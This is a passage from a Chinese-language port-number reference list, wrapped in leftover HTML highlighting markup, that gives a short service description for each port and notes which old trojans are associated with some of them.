class="hljs-string">端口：POP3服务器开放此端口,用于接收邮件</span><br><span class="hljs-number">111</span><span class="hljs-string">端口：SUN公司的RPC服务所有端口</span><br><span class="hljs-number">112</span><span class="hljs-string">端口：McIDAS</span> <span class="hljs-string">数据传输协议</span><br><span class="hljs-number">113</span><span class="hljs-string">端口：认证服务，用于鉴别TCP连接的用户</span><br><span class="hljs-number">114</span><span class="hljs-string">端口：音频新闻多点服务</span><br><span class="hljs-number">115</span><span class="hljs-string">端口：简单文件传输服务</span><br><span class="hljs-number">116</span><span class="hljs-string">端口：ANSA</span> <span class="hljs-string">REX</span> <span class="hljs-string">通知</span><br><span class="hljs-number">117</span><span class="hljs-string">端口：UUCP</span> <span class="hljs-string">路径服务</span><br><span class="hljs-number">118</span><span class="hljs-string">端口：SQL</span> <span class="hljs-string">服务</span><br><span class="hljs-number">119</span><span class="hljs-string">端口：NEWS新闻组传输协议，承载USENET通信</span><br><span class="hljs-number">121</span><span class="hljs-string">端口：木马BO</span> <span class="hljs-string">jammerkillahV开放端口</span><br><span class="hljs-number">122</span><span class="hljs-string">端口：SMAKY网络</span><br><span class="hljs-number">123</span><span class="hljs-string">端口：网络时间协议，蠕虫病毒会利用，一般关闭</span><br><span class="hljs-number">128</span><span class="hljs-string">端口：GSS</span> <span class="hljs-string">X许可认证</span><br><span class="hljs-number">129</span><span class="hljs-string">端口：密码生成器协议</span><br><span class="hljs-number">130</span><span class="hljs-string">端口：Cisco软件开放端口</span><br><span class="hljs-number">131</span><span class="hljs-string">端口：Cisco软件开放端口</span><br><span class="hljs-number">132</span><span class="hljs-string">端口：Cisco软件开放端口</span><br><span class="hljs-number">133</span><span class="hljs-string">端口：统计服务</span><br><span class="hljs-number">134</span><span class="hljs-string">端口：INGRES-网络服务</span><br><span class="hljs-number">135</span><span class="hljs-string">端口：DCOM服务，冲击波病毒利用，不能关闭</span><br><span class="hljs-number">136</span><span class="hljs-string">端口：命名系统</span><br><span class="hljs-number">137</span><span class="hljs-string">端口：NETBIOS协议应用，为共享开放</span><br><span class="hljs-number">138</span><span class="hljs-string">端口：NETBIOS协议应用，为共享开放</span><br><span class="hljs-number">139</span><span class="hljs-string">端口：NETBIOS协议应用，为共享开放</span><br><span class="hljs-number">140</span><span class="hljs-string">端口：EMFIS数据服务</span><br><span class="hljs-number">141</span><span class="hljs-string">端口：EMFIS控制服务</span><br><span class="hljs-number">143</span><span class="hljs-string">端口：Interim邮件访问协议</span><br><span class="hljs-number">144</span><span class="hljs-string">端口：UMA软件开放端口</span><br><span class="hljs-number">145</span><span class="hljs-string">端口：UAAC协议</span><br><span class="hljs-number">149</span><span class="hljs-string">端口：AED</span> <span class="hljs-number">512</span><span class="hljs-string">仿真服务</span><br><span class="hljs-number">150</span><span class="hljs-string">端口：SQL(结构化查询语言)-网络</span><br><span class="hljs-number">152</span><span class="hljs-string">端口：后台文件传输协议</span><br><span class="hljs-number">156</span><span class="hljs-string">端口：SQL(结构化查询语言)服务</span><br><span class="hljs-number">158</span><span class="hljs-string">端口：PC邮件服务器</span><br><span class="hljs-number">159</span><span class="hljs-string">端口：NSS-路由</span><br><span class="hljs-number">160</span><span class="hljs-string">端口：SGMP-陷阱</span><br><span class="hljs-number">161</span><span class="hljs-string">端口：简单网络管理协议</span><br><span class="hljs-number">162</span><span class="hljs-string">端口：SNMP陷阱</span><br><span class="hljs-number">163</span><span class="hljs-string">端口：CMIP/TCP</span> <span class="hljs-string">管理</span><br><span class="hljs-number">164</span><span class="hljs-string">端口：CMIP/TCP</span> <span class="hljs-string">代理</span><br><span class="hljs-number">166</span><span class="hljs-string">端口：Sirius系统</span><br><span class="hljs-number">169</span><span class="hljs-string">端口：发送</span><br><span class="hljs-number">170</span><span class="hljs-string">端口：网络附言</span><br><span class="hljs-number">177</span><span class="hljs-string">端口：x显示管理控制协议，入侵者通过它访问X-windows操作台</span><br><span class="hljs-number">178</span><span class="hljs-string">端口：NextStep</span> <span class="hljs-string">Window</span> <span class="hljs-string">服务</span><br><span class="hljs-number">179</span><span class="hljs-string">端口：边界网关协议</span><br><span class="hljs-number">180</span><span class="hljs-string">端口：图表</span><br><span class="hljs-number">181</span><span class="hljs-string">端口：统一</span><br><span class="hljs-number">184</span><span class="hljs-string">端口：OC服务器</span><br><span class="hljs-number">185</span><span class="hljs-string">端口：远程-KIS</span><br><span class="hljs-number">186</span><span class="hljs-string">端口：KIS</span> <span class="hljs-string">协议</span><br><span class="hljs-number">187</span><span class="hljs-string">端口：应用通信接口</span><br><span class="hljs-number">189</span><span class="hljs-string">端口：队列文件传输</span><br><span class="hljs-number">190</span><span class="hljs-string">端口：网关进入控制协议</span><br><span class="hljs-number">191</span><span class="hljs-string">端口：Prospero</span> <span class="hljs-string">目录服务</span><br><span class="hljs-number">192</span><span class="hljs-string">端口：OSU</span> <span class="hljs-string">网络监视系统</span><br><span class="hljs-number">193</span><span class="hljs-string">端口：Spider</span> <span class="hljs-string">远程控制协议</span><br><span class="hljs-number">194</span><span class="hljs-string">端口：多线交谈协议</span><br><span class="hljs-number">197</span><span class="hljs-string">端口：目录地址服务</span><br><span class="hljs-number">198</span><span class="hljs-string">端口：目录地址服务监视器</span><br><span class="hljs-number">200</span><span class="hljs-string">端口：IBM系统资源控制器</span><br><span class="hljs-number">201</span><span class="hljs-string">端口：AppleTalk(Mac机所用的网络协议)路由保证</span><br><span class="hljs-number">202</span><span class="hljs-string">端口：AppleTalk(Mac机所用的网络协议)Name</span> <span class="hljs-string">Binding</span><br><span class="hljs-number">203</span><span class="hljs-string">端口：AppleTalk(Mac机所用的网络协议)未用端口</span><br><span class="hljs-number">204</span><span class="hljs-string">端口：AppleTalk(Mac机所用的网络协议)回显</span><br><span class="hljs-number">205</span><span class="hljs-string">端口：AppleTalk(Mac机所用的网络协议)未用端口</span><br><span class="hljs-number">206</span><span class="hljs-string">端口：AppleTalk(Mac机所用的网络协议)区信息</span><br><span class="hljs-number">207</span><span class="hljs-string">端口：AppleTalk(Mac机所用的网络协议)未用端口</span><br><span class="hljs-number">208</span><span class="hljs-string">端口：AppleTalk(Mac机所用的网络协议)未用端口</span><br><span class="hljs-number">209</span><span class="hljs-string">端口：快速邮件传输协议</span><br><span class="hljs-number">210</span><span class="hljs-string">端口：ANSI(美国国家标准协会)Z39.50</span><br><span class="hljs-number">211</span><span class="hljs-string">端口：Texas</span> <span class="hljs-string">Instruments</span> <span class="hljs-string">914C/G终端</span><br><span class="hljs-number">213</span><span class="hljs-string">端口：IPX(以太网所用的协议)</span><br><span class="hljs-number">218</span><span class="hljs-string">端口：Netix消息记录协议</span><br><span class="hljs-number">219</span><span class="hljs-string">端口：Unisys</span> <span class="hljs-string">ARPs</span><br><span class="hljs-number">220</span><span class="hljs-string">端口：交互邮件访问协议</span> <span class="hljs-string">v3</span><br><span class="hljs-number">223</span><span class="hljs-string">端口：证书分发中心</span><br><span class="hljs-number">224</span><span class="hljs-string">端口：masq拨号器</span><br><span class="hljs-number">241</span><span class="hljs-string">端口：预留端口</span> <span class="hljs-string">(224-241)</span><br><span class="hljs-number">245</span><span class="hljs-string">端口：链接</span><br><span class="hljs-number">246</span><span class="hljs-string">端口：显示系统协议</span><br><span class="hljs-number">257</span><span class="hljs-string">端口：安全电子交易系统</span><br><span class="hljs-number">258</span><span class="hljs-string">端口：Yak</span> <span class="hljs-string">Winsock</span> <span class="hljs-string">个人聊天</span><br><span class="hljs-number">259</span><span class="hljs-string">端口：有效短程遥控</span><br><span class="hljs-number">260</span><span class="hljs-string">端口：开放端口</span><br><span class="hljs-number">261</span><span class="hljs-string">端口：IIOP</span> <span class="hljs-string">基于TLS/SSL的命名服务</span><br><span class="hljs-number">266</span><span class="hljs-string">端口：SCSI(小型计算机系统接口)on</span> <span class="hljs-string">ST</span><br><span class="hljs-number">267</span><span class="hljs-string">端口：Tobit</span> <span class="hljs-string">David服务层</span><br><span class="hljs-number">268</span><span class="hljs-string">端口：Tobit</span> <span class="hljs-string">David复制</span><br><span class="hljs-number">281</span><span class="hljs-string">端口：个人连结</span><br><span class="hljs-number">282</span><span class="hljs-string">端口：Cable端口A/X</span><br><span class="hljs-number">286</span><span class="hljs-string">端口：FXP通信</span><br><span class="hljs-number">308</span><span class="hljs-string">端口：Novastor备份</span><br><span class="hljs-number">313</span><span class="hljs-string">端口：Magenta逻辑</span><br><span class="hljs-number">318</span><span class="hljs-string">端口：PKIX时间标记</span><br><span class="hljs-number">333</span><span class="hljs-string">端口：Texar安全端口</span><br><span class="hljs-number">344</span><span class="hljs-string">端口：Prospero数据存取协议</span><br><span class="hljs-number">345</span><span class="hljs-string">端口：Perf分析工作台</span><br><span class="hljs-number">346</span><span class="hljs-string">端口：Zebra服务器</span><br><span class="hljs-number">347</span><span class="hljs-string">端口：Fatmen服务器</span><br><span class="hljs-number">348</span><span class="hljs-string">端口：Cabletron管理协议</span><br><span class="hljs-number">358</span><span class="hljs-string">端口：Shrink可上网家电协议</span><br><span class="hljs-number">359</span><span class="hljs-string">端口：网络安全风险管理协议</span><br><span class="hljs-number">362</span><span class="hljs-string">端口：SRS发送</span><br><span class="hljs-number">363</span><span class="hljs-string">端口：RSVP隧道</span><br><span class="hljs-number">372</span><span class="hljs-string">端口：列表处理</span><br><span class="hljs-number">373</span><span class="hljs-string">端口：Legend公司</span><br><span class="hljs-number">374</span><span class="hljs-string">端口：Legend公司</span><br><span class="hljs-number">376</span><span class="hljs-string">端口：AmigaEnvoy网络查询协议</span><br><span class="hljs-number">377</span><span class="hljs-string">端口：NEC公司</span><br><span class="hljs-number">378</span><span class="hljs-string">端口：NEC公司</span><br><span class="hljs-number">379</span><span class="hljs-string">端口：TIA/EIA/IS-99调制解调器客户端</span><br><span class="hljs-number">380</span><span class="hljs-string">端口：TIA/EIA/IS-99调制解调器服务器</span><br><span class="hljs-number">381</span><span class="hljs-string">端口：hp(惠普)性能数据收集器</span><br><span class="hljs-number">382</span><span class="hljs-string">端口：hp(惠普)性能数据控制节点</span><br><span class="hljs-number">383</span><span class="hljs-string">端口：hp(惠普)性能数据警报管理</span><br><span class="hljs-number">384</span><span class="hljs-string">端口：远程网络服务器系统</span><br><span class="hljs-number">385</span><span class="hljs-string">端口：IBM应用程序</span><br><span class="hljs-number">386</span><span class="hljs-string">端口：ASA信息路由器定义文件.</span><br><span class="hljs-number">387</span><span class="hljs-string">端口：Appletalk更新路由.</span><br><span class="hljs-number">389</span><span class="hljs-string">端口：轻型目录访问协议</span><br><span class="hljs-number">395</span><span class="hljs-string">端口：网络监视控制协议</span><br><span class="hljs-number">396</span><span class="hljs-string">端口：Novell(美国Novell公司)Netware(Novell公司出的网络操作系统)over</span> <span class="hljs-string">IP</span><br><span class="hljs-number">400</span><span class="hljs-string">端口：工作站解决方案</span><br><span class="hljs-number">401</span><span class="hljs-string">端口：持续电源</span><br><span class="hljs-number">402</span><span class="hljs-string">端口：Genie协议</span><br><span class="hljs-number">406</span><span class="hljs-string">端口：交互式邮件支持协议</span><br><span class="hljs-number">408</span><span class="hljs-string">端口：Prospero资源管理程序</span><br><span class="hljs-number">409</span><span class="hljs-string">端口：Prospero资源节点管理.</span><br><span class="hljs-number">410</span><span class="hljs-string">端口：DEC(数据设备公司)远程调试协议</span><br><span class="hljs-number">411</span><span class="hljs-string">端口：远程MT协议</span><br><span class="hljs-number">412</span><span class="hljs-string">端口：陷阱协定端口</span><br><span class="hljs-number">413</span><span class="hljs-string">端口：存储管理服务协议</span><br><span class="hljs-number">414</span><span class="hljs-string">端口：信息查询</span><br><span class="hljs-number">415</span><span class="hljs-string">端口：B网络</span><br><span class="hljs-number">423</span><span class="hljs-string">端口：IBM操作计划和控制开端</span><br><span class="hljs-number">424</span><span class="hljs-string">端口：IBM操作计划和控制追踪</span><br><span class="hljs-number">425</span><span class="hljs-string">端口：智能计算机辅助设计</span><br><span class="hljs-number">427</span><span class="hljs-string">端口：服务起位置</span><br><span class="hljs-number">434</span><span class="hljs-string">端口：移动ip代理</span><br><span class="hljs-number">435</span><span class="hljs-string">端口：移动ip管理</span><br><span class="hljs-number">443</span><span class="hljs-string">端口：基于TLS/SSL的网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP</span><br><span class="hljs-number">444</span><span class="hljs-string">端口：简单网络内存分页协议</span><br><span class="hljs-number">445</span><span class="hljs-string">端口：Microsoft-DS，为共享开放，震荡波病毒利用，一般应关闭</span><br><span class="hljs-number">446</span><span class="hljs-string">端口：DDM-远程关系数据库访问</span><br><span class="hljs-number">447</span><span class="hljs-string">端口：DDM-分布式文件管理</span><br><span class="hljs-number">448</span><span class="hljs-string">端口：DDM-使用安全访问远程数据库</span><br><span class="hljs-number">456</span><span class="hljs-string">端口：木马HACKERS</span> <span class="hljs-string">PARADISE开放此端口</span><br><span class="hljs-number">458</span><span class="hljs-string">端口：apple</span> <span class="hljs-string">quick</span> <span class="hljs-string">time软件开放端口</span><br><span class="hljs-number">459</span><span class="hljs-string">端口：ampr-rcmd命令</span><br><span class="hljs-number">464</span><span class="hljs-string">端口：k密码服务</span><br><span class="hljs-number">469</span><span class="hljs-string">端口：广播控制协议</span><br><span class="hljs-number">470</span><span class="hljs-string">端口：scx-代理</span><br><span class="hljs-number">472</span><span class="hljs-string">端口：ljk-登陆</span><br><span class="hljs-number">481</span><span class="hljs-string">端口：Ph服务</span><br><span class="hljs-number">487</span><span class="hljs-string">端口：简单异步文件传输</span><br><span class="hljs-number">489</span><span class="hljs-string">端口：nest-协议</span><br><span class="hljs-number">491</span><span class="hljs-string">端口：go-登陆</span><br><span class="hljs-number">499</span><span class="hljs-string">端口：ISO</span> <span class="hljs-string">ILL协议</span><br><span class="hljs-number">500</span><span class="hljs-string">端口：Internet密钥交换，Lsass开放端口，不能关闭</span><br><span class="hljs-number">509</span><span class="hljs-string">端口：陷阱</span><br><span class="hljs-number">510</span><span class="hljs-string">端口：FirstClass协议</span><br><span class="hljs-number">512</span><span class="hljs-string">端口：远程进程执行</span><br><span class="hljs-number">513</span><span class="hljs-string">端口：远程登陆</span><br><span class="hljs-number">514</span><span class="hljs-string">端口：cmd命令</span><br><span class="hljs-number">515</span><span class="hljs-string">端口：spooler</span><br><span class="hljs-number">516</span><span class="hljs-string">端口：可视化数据</span><br><span class="hljs-number">518</span><span class="hljs-string">端口：交谈</span><br><span class="hljs-number">519</span><span class="hljs-string">端口：unix时间</span><br><span class="hljs-number">520</span><span class="hljs-string">端口：扩展文件名称服务器</span><br><span class="hljs-number">525</span><span class="hljs-string">端口：时间服务</span><br><span class="hljs-number">526</span><span class="hljs-string">端口：新日期</span><br><span class="hljs-number">529</span><span class="hljs-string">端口：在线聊天系统服务</span><br><span class="hljs-number">530</span><span class="hljs-string">端口：远程过程调用</span><br><span class="hljs-number">531</span><span class="hljs-string">端口：聊天</span><br><span class="hljs-number">532</span><span class="hljs-string">端口：读新闻</span><br><span class="hljs-number">533</span><span class="hljs-string">端口：紧急广播端口</span><br><span class="hljs-number">534</span><span class="hljs-string">端口：MegaMedia管理端</span><br><span class="hljs-number">537</span><span class="hljs-string">端口：网络流媒体协议</span><br><span class="hljs-number">542</span><span class="hljs-string">端口：商业</span><br><span class="hljs-number">543</span><span class="hljs-string">端口：Kerberos(软件)v4/v5</span><br><span class="hljs-number">544</span><span class="hljs-string">端口：krcmd命令</span><br><span class="hljs-number">546</span><span class="hljs-string">端口：DHCPv6</span> <span class="hljs-string">客户端</span><br><span class="hljs-number">547</span><span class="hljs-string">端口：DHCPv6</span> <span class="hljs-string">服务器</span><br><span class="hljs-number">552</span><span class="hljs-string">端口：设备共享</span><br><span class="hljs-number">554</span><span class="hljs-string">端口：Real</span> <span class="hljs-string">Time</span> <span class="hljs-string">Stream控制协议</span><br><span class="hljs-number">555</span><span class="hljs-string">端口：木马PhAse1.0、Stealth</span> <span class="hljs-string">Spy、IniKiller开放此端口</span><br><span class="hljs-number">556</span><span class="hljs-string">端口：远距离文件服务器</span><br><span class="hljs-number">563</span><span class="hljs-string">端口：基于TLS/SSL的网络新闻传输协议</span><br><span class="hljs-number">564</span><span class="hljs-string">端口：plan</span> <span class="hljs-number">9</span><span class="hljs-string">文件服务</span><br><span class="hljs-number">565</span><span class="hljs-string">端口：whoami查询</span><br><span class="hljs-number">566</span><span class="hljs-string">端口：streettalk</span><br><span class="hljs-number">567</span><span class="hljs-string">端口：banyan-rpc(远程过程调用)</span><br><span class="hljs-number">568</span><span class="hljs-string">端口：DPA成员资格</span><br><span class="hljs-number">569</span><span class="hljs-string">端口：MSN成员资格</span><br><span class="hljs-number">570</span><span class="hljs-string">端口：demon(调试监督程序)</span><br><span class="hljs-number">571</span><span class="hljs-string">端口：udemon(调试监督程序)</span><br><span class="hljs-number">572</span><span class="hljs-string">端口：声纳</span><br><span class="hljs-number">573</span><span class="hljs-string">端口：banyan-贵宾</span><br><span class="hljs-number">574</span><span class="hljs-string">端口：FTP软件代理系统</span><br><span class="hljs-number">581</span><span class="hljs-string">端口：Bundle</span> <span class="hljs-string">Discovery</span> <span class="hljs-string">协议</span><br><span class="hljs-number">582</span><span class="hljs-string">端口：SCC安全</span><br><span class="hljs-number">583</span><span class="hljs-string">端口：Philips视频会议</span><br><span class="hljs-number">584</span><span class="hljs-string">端口：密钥服务器</span><br><span class="hljs-number">585</span><span class="hljs-string">端口：IMAP4+SSL</span> <span class="hljs-string">(Use</span> <span class="hljs-number">993</span> <span class="hljs-string">instead)</span><br><span class="hljs-number">586</span><span class="hljs-string">端口：密码更改</span><br><span class="hljs-number">587</span><span class="hljs-string">端口：申请</span><br><span class="hljs-number">589</span><span class="hljs-string">端口：Eye连结</span><br><span class="hljs-number">595</span><span class="hljs-string">端口：CAB协议</span><br><span class="hljs-number">597</span><span class="hljs-string">端口：PTC名称服务</span><br><span class="hljs-number">598</span><span class="hljs-string">端口：SCO网络服务器管理3</span><br><span class="hljs-number">599</span><span class="hljs-string">端口：Aeolon</span> <span class="hljs-string">Core协议</span><br><span class="hljs-number">600</span><span class="hljs-string">端口：Sun</span> <span class="hljs-string">IPC(进程间通讯)服务器</span><br><span class="hljs-number">601</span><span class="hljs-string">端口：可靠系统登陆服务</span><br><span class="hljs-number">604</span><span class="hljs-string">端口：通道</span><br><span class="hljs-number">606</span><span class="hljs-string">端口：Cray统一资源管理</span><br><span class="hljs-number">608</span><span class="hljs-string">端口：发送人-传递/提供</span> <span class="hljs-string">文件传输器</span><br><span class="hljs-number">609</span><span class="hljs-string">端口：npmp-陷阱</span><br><span class="hljs-number">610</span><span class="hljs-string">端口：npmp-本地</span><br><span class="hljs-number">611</span><span class="hljs-string">端口：npmp-gui(</span> <span class="hljs-string">图形用户界面)</span><br><span class="hljs-number">612</span><span class="hljs-string">端口：HMMP指引</span><br><span class="hljs-number">613</span><span class="hljs-string">端口：HMMP操作</span><br><span class="hljs-number">614</span><span class="hljs-string">端口：SSL(加密套接字协议层)shell(壳)</span><br><span class="hljs-number">615</span><span class="hljs-string">端口：Internet配置管理</span><br><span class="hljs-number">616</span><span class="hljs-string">端口：SCO(Unix系统)系统管理服务器</span><br><span class="hljs-number">617</span><span class="hljs-string">端口：SCO桌面管理服务器</span><br><span class="hljs-number">619</span><span class="hljs-string">端口：Compaq(康柏公司)EVM</span><br><span class="hljs-number">620</span><span class="hljs-string">端口：SCO服务器管理</span><br><span class="hljs-number">623</span><span class="hljs-string">端口：ASF远程管理控制协议</span><br><span class="hljs-number">624</span><span class="hljs-string">端口：Crypto管理</span><br><span class="hljs-number">631</span><span class="hljs-string">端口：IPP</span> <span class="hljs-string">(Internet打印协议)</span><br><span class="hljs-number">633</span><span class="hljs-string">端口：服务更新(Sterling软件)</span><br><span class="hljs-number">637</span><span class="hljs-string">端口：局域网服务器</span><br><span class="hljs-number">641</span><span class="hljs-string">端口：repcmd命令</span><br><span class="hljs-number">647</span><span class="hljs-string">端口：DHCP(动态主机配置协议)Failover</span><br><span class="hljs-number">648</span><span class="hljs-string">端口：注册登记协议(RRP)</span><br><span class="hljs-number">649</span><span class="hljs-string">端口：Cadview-3d软件协议</span><br><span class="hljs-number">666</span><span class="hljs-string">端口：木马Attack</span> <span class="hljs-string">FTP、Satanz</span> <span class="hljs-string">Backdoor开放此端口</span><br><span class="hljs-number">808</span><span class="hljs-string">端口：ccproxy</span> <span class="hljs-string">http/gopher/ftp</span> <span class="hljs-string">(over</span> <span class="hljs-string">http)协议</span><br><span class="hljs-number">1001</span><span class="hljs-string">端口：木马Silencer，WebEx开放端口</span><br><span class="hljs-number">1011</span><span class="hljs-string">端口：木马Doly开放端口</span><br><span class="hljs-number">1024</span><span class="hljs-string">端口：动态端口的开始,木马yai开放端口</span><br><span class="hljs-number">1025</span><span class="hljs-string">端口：inetinfo.exe(互联网信息服务)木马netspy开放端口</span><br><span class="hljs-number">1026</span><span class="hljs-string">端口：inetinfo.exe(互联网信息服务)</span><br><span class="hljs-number">1027</span><span class="hljs-string">端口：应用层网关服务</span><br><span class="hljs-number">1030</span><span class="hljs-string">端口：应用层网关服务</span><br><span class="hljs-number">1031</span><span class="hljs-string">端口：BBN</span> <span class="hljs-string">IAD</span><br><span class="hljs-number">1033</span><span class="hljs-string">端口：本地网络信息端口</span><br><span class="hljs-number">1034</span><span class="hljs-string">端口：同步通知</span><br><span class="hljs-number">1036</span><span class="hljs-string">端口：安全部分传输协议</span><br><span class="hljs-number">1070</span><span class="hljs-string">端口：木马Psyber</span> <span class="hljs-string">Stream，Streaming</span> <span class="hljs-string">Audio开放端口</span><br><span class="hljs-number">1071</span><span class="hljs-string">端口：网络服务开放端口</span><br><span class="hljs-number">1074</span><span class="hljs-string">端口：网络服务开放端口</span><br><span class="hljs-number">1080</span><span class="hljs-string">端口：Socks这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET</span><br><span class="hljs-number">1110</span><span class="hljs-string">端口：卡巴斯基反病毒软件开放此端口</span><br><span class="hljs-number">1125</span><span class="hljs-string">端口：卡巴斯基反病毒软件开放此端口</span><br><span class="hljs-number">1203</span><span class="hljs-string">端口：许可证生效端口</span><br><span class="hljs-number">1204</span><span class="hljs-string">端口：登陆请求监听端口</span><br><span class="hljs-number">1206</span><span class="hljs-string">端口：Anthony数据端口</span><br><span class="hljs-number">1222</span><span class="hljs-string">端口：SNI</span> <span class="hljs-string">R&amp;D网络端口</span><br><span class="hljs-number">1233</span><span class="hljs-string">端口：普遍的附录服务器端口</span><br><span class="hljs-number">1234</span><span class="hljs-string">端口：木马SubSeven2.0、Ultors</span> <span class="hljs-string">Trojan开放此端口</span><br><span class="hljs-number">1243</span><span class="hljs-string">端口：木马SubSeven1.0/1.9开放此端口</span><br><span class="hljs-number">1245</span><span class="hljs-string">端口：木马Vodoo，GabanBus，NetBus，Vodoo开放此端口</span><br><span class="hljs-number">1273</span><span class="hljs-string">端口：EMC-网关端口</span><br><span class="hljs-number">1289</span><span class="hljs-string">端口：JWalk服务器端口</span><br><span class="hljs-number">1290</span><span class="hljs-string">端口：WinJa服务器端口</span><br><span class="hljs-number">1333</span><span class="hljs-string">端口：密码策略(网络服务)(svchost.exe)</span><br><span class="hljs-number">1334</span><span class="hljs-string">端口：网络服务(svchost.exe)</span><br><span class="hljs-number">1335</span><span class="hljs-string">端口：数字公正协议</span><br><span class="hljs-number">1336</span><span class="hljs-string">端口：即时聊天协议(svchost.exe)</span><br><span class="hljs-number">1349</span><span class="hljs-string">端口：注册网络协议端口</span><br><span class="hljs-number">1350</span><span class="hljs-string">端口：注册网络协议端口</span><br><span class="hljs-number">1371</span><span class="hljs-string">端口：富士通配置协议端口</span><br><span class="hljs-number">1372</span><span class="hljs-string">端口：富士通配置协议端口</span><br><span class="hljs-number">1374</span><span class="hljs-string">端口：EPI软件系统端口</span><br><span class="hljs-number">1376</span><span class="hljs-string">端口：IBM个人-个人软件端口</span><br><span class="hljs-number">1377</span><span class="hljs-string">端口：Cichlid许可证管理端口</span><br><span class="hljs-number">1378</span><span class="hljs-string">端口：Elan许可证管理端口</span><br><span class="hljs-number">1380</span><span class="hljs-string">端口：Telesis网络许可证管理端口</span><br><span class="hljs-number">1381</span><span class="hljs-string">端口：苹果网络许可证管理端口</span><br><span class="hljs-number">1386</span><span class="hljs-string">端口：CheckSum</span> <span class="hljs-string">许可证管理端口</span><br><span class="hljs-number">1387</span><span class="hljs-string">端口：系统开放端口(rundll32.exe)</span><br><span class="hljs-number">1388</span><span class="hljs-string">端口：数据库高速缓存端口</span><br><span class="hljs-number">1389</span><span class="hljs-string">端口：文档管理端口</span><br><span class="hljs-number">1390</span><span class="hljs-string">端口：存储控制器端口</span><br><span class="hljs-number">1391</span><span class="hljs-string">端口：存储器存取服务器端口</span><br><span class="hljs-number">1392</span><span class="hljs-string">端口：打印管理端口</span><br><span class="hljs-number">1393</span><span class="hljs-string">端口：网络登陆服务器端口</span><br><span class="hljs-number">1394</span><span class="hljs-string">端口：网络登陆客户端端口</span><br><span class="hljs-number">1395</span><span class="hljs-string">端口：PC工作站管理软件端口</span><br><span class="hljs-number">1396</span><span class="hljs-string">端口：DVL活跃邮件端口</span><br><span class="hljs-number">1397</span><span class="hljs-string">端口：音频活跃邮件端口</span><br><span class="hljs-number">1398</span><span class="hljs-string">端口：视频活跃邮件端口</span><br><span class="hljs-number">1399</span><span class="hljs-string">端口：Cadkey许可证管理端口</span><br><span class="hljs-number">1433</span><span class="hljs-string">端口：Microsoft的SQL服务开放端口</span><br><span class="hljs-number">1434</span><span class="hljs-string">端口：Microsoft的SQL服务监视端口</span><br><span class="hljs-number">1492</span><span class="hljs-string">端口：木马FTP99CMP开放此端口</span><br><span class="hljs-number">1509</span><span class="hljs-string">端口：木马Psyber</span> <span class="hljs-string">Streaming</span> <span class="hljs-string">Server开放此端口</span><br><span class="hljs-number">1512</span><span class="hljs-string">端口：Microsoft</span> <span class="hljs-string">Windows网络名称服务</span><br><span class="hljs-number">1524</span><span class="hljs-string">端口：许多攻击脚本安装一个后门SHELL于这个端口</span><br><span class="hljs-number">1600</span><span class="hljs-string">端口：木马Shivka-Burka开放此端口</span><br><span class="hljs-number">1645</span><span class="hljs-string">端口：远程认证拨号用户服务</span><br><span class="hljs-number">1701</span><span class="hljs-string">端口：第2层隧道协议</span><br><span class="hljs-number">1731</span><span class="hljs-string">端口：NetMeeting音频调用控制</span><br><span class="hljs-number">1801</span><span class="hljs-string">端口：Microsoft消息队列服务器</span><br><span class="hljs-number">1807</span><span class="hljs-string">端口：木马SpySender开放此端口</span><br><span class="hljs-number">1900</span><span class="hljs-string">端口：可被利用ddos攻击，一般关闭</span><br><span class="hljs-number">1912</span><span class="hljs-string">端口：金山词霸开放此端口</span><br><span class="hljs-number">1981</span><span class="hljs-string">端口：木马ShockRave开放此端口</span><br><span class="hljs-number">1999</span><span class="hljs-string">端口：木马BackDoor,yai开放此端口</span><br><span class="hljs-number">2000</span><span class="hljs-string">端口：木马GirlFriend</span> <span class="hljs-number">1.3</span><span class="hljs-string">、Millenium</span> <span class="hljs-number">1.0</span><span class="hljs-string">开放此端口</span><br><span class="hljs-number">2001</span><span class="hljs-string">端口：木马Millenium</span> <span class="hljs-number">1.0</span><span class="hljs-string">、Trojan</span> <span class="hljs-string">Cow,黑洞2001开放此端口</span><br><span class="hljs-number">2003</span><span class="hljs-string">端口：GNU</span> <span class="hljs-string">查询</span><br><span class="hljs-number">2023</span><span class="hljs-string">端口：木马Pass</span> <span class="hljs-string">Ripper开放此端口</span><br><span class="hljs-number">2049</span><span class="hljs-string">端口：NFS程序常运行于此端口</span><br><span class="hljs-number">2115</span><span class="hljs-string">端口：木马Bugs开放此端口</span><br><span class="hljs-number">2140</span><span class="hljs-string">端口：木马Deep</span> <span class="hljs-string">Throat</span> <span class="hljs-number">1.0</span><span class="hljs-string">/3.0，The</span> <span class="hljs-string">Invasor开放此端口</span><br><span class="hljs-number">2500</span><span class="hljs-string">端口：应用固定端口会话复制的RPC客户</span><br><span class="hljs-number">2504</span><span class="hljs-string">端口：网络平衡负荷</span><br><span class="hljs-number">2565</span><span class="hljs-string">端口：木马Striker开放此端口</span><br><span class="hljs-number">2583</span><span class="hljs-string">端口：木马Wincrash</span> <span class="hljs-number">2.0</span><span class="hljs-string">开放此端口</span><br><span class="hljs-number">2801</span><span class="hljs-string">端口：木马Phineas</span> <span class="hljs-string">Phucker开放此端口</span><br><span class="hljs-number">2847</span><span class="hljs-string">端口：诺顿反病毒服务开放此端口</span><br><span class="hljs-number">3024</span><span class="hljs-string">端口：木马WinCrash开放此端口</span><br><span class="hljs-number">3128</span><span class="hljs-string">端口：squid</span> <span class="hljs-string">http代理服务器开放此端口</span><br><span class="hljs-number">3129</span><span class="hljs-string">端口：木马Master</span> <span class="hljs-string">Paradise开放此端口</span><br><span class="hljs-number">3150</span><span class="hljs-string">端口：木马The</span> <span class="hljs-string">Invasor,deep</span> <span class="hljs-string">throat开放此端口</span><br><span class="hljs-number">3210</span><span class="hljs-string">端口：木马SchoolBus开放此端口</span><br><span class="hljs-number">3306</span><span class="hljs-string">端口：MySQL开放此端口</span><br><span class="hljs-number">3333</span><span class="hljs-string">端口：木马Prosiak开放此端口</span><br><span class="hljs-number">3389</span><span class="hljs-string">端口：WINDOWS</span> <span class="hljs-number">2000</span><span class="hljs-string">终端开放此端口</span><br><span class="hljs-number">3456</span><span class="hljs-string">端口：inetinfo.exe(互联网信息服务)开放端口，VAT默认数据</span><br><span class="hljs-number">3457</span><span class="hljs-string">端口：VAT默认控制</span><br><span class="hljs-number">3527</span><span class="hljs-string">端口：Microsoft消息队列服务器</span><br><span class="hljs-number">3700</span><span class="hljs-string">端口：木马Portal</span> <span class="hljs-string">of</span> <span class="hljs-string">Doom开放此端口</span><br><span 